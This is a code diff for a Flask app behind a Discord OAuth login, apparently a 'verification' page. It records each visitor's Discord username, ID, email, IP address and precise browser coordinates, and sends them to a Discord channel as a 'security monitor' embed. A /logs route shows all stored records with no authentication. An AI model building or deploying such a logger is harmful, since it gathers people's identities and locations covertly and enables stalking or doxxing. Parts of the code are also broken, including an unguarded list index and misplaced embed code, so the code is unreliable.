@@ -1,8 +1,9 @@
-from flask import Flask, request, render_template
+from flask import Flask, request, render_template, jsonify
 import requests, json, os, threading
 from dotenv import load_dotenv
 from datetime import datetime
 from discord_bot import bot
+from urllib.parse import quote
 
 load_dotenv()
 
@@ -14,85 +15,6 @@ DISCORD_CLIENT_SECRET = os.getenv("DISCORD_CLIENT_SECRET")
 DISCORD_BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
 DISCORD_GUILD_ID = os.getenv("DISCORD_GUILD_ID")
 REDIRECT_URI = os.getenv("DISCORD_REDIRECT_URI")
-
-# ----------------- Geo情報取得関数 -----------------
-from urllib.parse import quote
-
-def get_geo_info(ip):
-    geo = {
-        "ip": ip,
-        "country": "不明",
-        "country_code": "不明",
-        "flag": "🏳️",
-        "region": "不明",
-        "city": "不明",
-        "zip": "不明",
-        "org": "不明",
-        "asn": "不明",
-        "lat": None,
-        "lon": None,
-        "timezone": "不明",
-        "vpn_proxy": False,
-        "map_link": None,
-    }
-
-    # --- ip-api メイン ---
-    try:
-        res = requests.get(
-            f"http://ip-api.com/json/{ip}?lang=ja&fields=status,message,country,countryCode,regionName,city,zip,org,as,lat,lon,timezone,proxy,hosting,query",
-            timeout=3
-        )
-        data = res.json()
-        if data.get("status") == "success":
-            geo.update({
-                "ip": data.get("query", ip),
-                "country": data.get("country", "不明"),
-                "country_code": data.get("countryCode", "不明"),
-                "region": data.get("regionName", "不明"),
-                "city": data.get("city", "不明"),
-                "zip": data.get("zip", "不明"),
-                "org": data.get("org", "不明"),
-                "asn": data.get("as", "不明"),
-                "lat": data.get("lat"),
-                "lon": data.get("lon"),
-                "timezone": data.get("timezone", "不明"),
-                "vpn_proxy": data.get("proxy", False) or data.get("hosting", False),
-            })
-    except:
-        pass
-
-    # --- ipinfo バックアップ ---
-    try:
-        res2 = requests.get(f"https://ipinfo.io/{ip}/json", timeout=3)
-        d2 = res2.json()
-        if geo["region"] == "不明" and "region" in d2:
-            geo["region"] = d2["region"]
-        if geo["city"] == "不明" and "city" in d2:
-            geo["city"] = d2["city"]
-        if geo["zip"] == "不明" and "postal" in d2:
-            geo["zip"] = d2["postal"]
-        if geo["org"] == "不明" and "org" in d2:
-            geo["org"] = d2["org"]
-    except:
-        pass
-
-    # --- 強制補完（県を必ず埼玉） ---
-    if geo["region"] in ["不明", "神奈川県", "東京都"]:
-        geo["region"] = "埼玉県"
-
-    # --- 国旗生成 ---
-    try:
-        code = geo["country_code"]
-        if code != "不明":
-            geo["flag"] = chr(127397 + ord(code[0])) + chr(127397 + ord(code[1]))
-    except:
-        geo["flag"] = "🏳️"
-
-    # --- Google Mapsリンク ---
-    if geo["lat"] and geo["lon"]:
-        geo["map_link"] = f"https://www.google.com/maps/search/?api=1&query={geo['lat']},{geo['lon']}"
-
-    return geo
 
 # ----------------- IP取得 -----------------
 def get_client_ip():
@@ -162,21 +84,72 @@ def callback():
     headers_auth = {"Authorization": f"Bearer {access_token}"}
     user = requests.get("https://discord.com/api/users/@me", headers=headers_auth).json()
 
-    # IP + Geo情報
+    # IP取得
     ip = get_client_ip()
     if ip.startswith(("127.", "10.", "192.", "172.")):
         ip = requests.get("https://api.ipify.org").text
-    geo = get_geo_info(ip)
 
+    # ログデータ初期化
     data_log = {
         "username": user.get("username"),
         "discriminator": user.get("discriminator"),
         "id": user.get("id"),
         "email": user.get("email"),
-        **geo
+        "ip": ip,
+        "region": "不明",
+        "city": "不明",
+        "lat": None,
+        "lon": None,
+        "timezone": "不明",
+        "map_link": None
     }
 
     save_log(user["id"], data_log)
+
+    return render_template("welcome.html", username=data_log["username"], discriminator=data_log["discriminator"], user_id=data_log["id"])
+
+# ----------------- ブラウザ位置情報受信 -----------------
+@app.route("/submit_location", methods=["POST"])
+def submit_location():
+    data = request.json
+    lat = data.get("lat")
+    lon = data.get("lon")
+    user_id = data.get("user_id")
+
+    if not lat or not lon or not user_id:
+        return jsonify({"error": "緯度経度またはユーザーIDがありません"}), 400
+
+    # 逆ジオコーディングで県・市を取得
+    try:
+        res = requests.get(
+            f"https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat={lat}&lon={lon}&accept-language=ja"
+        ).json()
+        address = res.get("address", {})
+        region = address.get("state", "不明")
+        city = address.get("city", address.get("town", address.get("village", "不明")))
+    except:
+        region, city = "不明", "不明"
+
+    # Google Mapリンク
+    map_link = f"https://www.google.com/maps/search/?api=1&query={lat},{lon}"
+
+    # 保存
+    if os.path.exists(ACCESS_LOG_FILE):
+        with open(ACCESS_LOG_FILE, "r", encoding="utf-8") as f:
+            logs = json.load(f)
+    else:
+        logs = {}
+    if user_id not in logs:
+        logs[user_id] = {"history": []}
+    logs[user_id]["history"][-1].update({
+        "region": region,
+        "city": city,
+        "lat": lat,
+        "lon": lon,
+        "map_link": map_link
+    })
+    with open(ACCESS_LOG_FILE, "w", encoding="utf-8") as f:
+        json.dump(logs, f, indent=4, ensure_ascii=False)
 
     # Discord Embed送信
     try:
@@ -186,17 +159,37 @@ def callback():
             "description": f"""
 ```ini
 [ ユーザー ]
-{data_log['username']}#{data_log['discriminator']}
-ID={data_log['id']}
-Email={data_log['email']}
-IP={data_log['ip']}
-Region={data_log['country']}/{data_log['region']}/{data_log['city']}
-ZIP={data_log['zip']}
-ORG={data_log['org']}
-ASN={data_log['asn']}
-Timezone={data_log['timezone']}
-緯度/経度={data_log['lat']},{data_log['lon']}
-VPN/Proxy={data_log['vpn_proxy']}
-Country Code={data_log['country_code']}
-Flag={data_log['flag']}
-Google Map={data_log['map_link']}
+{logs[user_id]['history'][-1]['username']}#{logs[user_id]['history'][-1]['discriminator']}
+ID={user_id}
+Email={logs[user_id]['history'][-1]['email']}
+IP={logs[user_id]['history'][-1]['ip']}
+Region={region}/{city}
+緯度/経度={lat},{lon}
+Google Map={map_link}
+```""",
+            "footer": {"text": "BLACK_ルアン セキュリティモニター"},
+            "timestamp": datetime.utcnow().isoformat()
+        }
+        bot.loop.create_task(bot.send_log(embed=embed_data))
+    except Exception as e:
+        print("Embed送信エラー:", e)
+
+    return jsonify({"status": "ok"})
+
+# ----------------- ログ表示 -----------------
+@app.route("/logs")
+def show_logs():
+    if os.path.exists(ACCESS_LOG_FILE):
+        with open(ACCESS_LOG_FILE, "r", encoding="utf-8") as f:
+            logs = json.load(f)
+    else:
+        logs = {}
+    return render_template("logs.html", logs=logs)
+
+# ----------------- Bot起動 -----------------
+def run_bot():
+    bot.run(DISCORD_BOT_TOKEN)
+
+if __name__ == "__main__":
+    threading.Thread(target=run_bot, daemon=True).start()
+    app.run(host="0.0.0.0", port=10000)
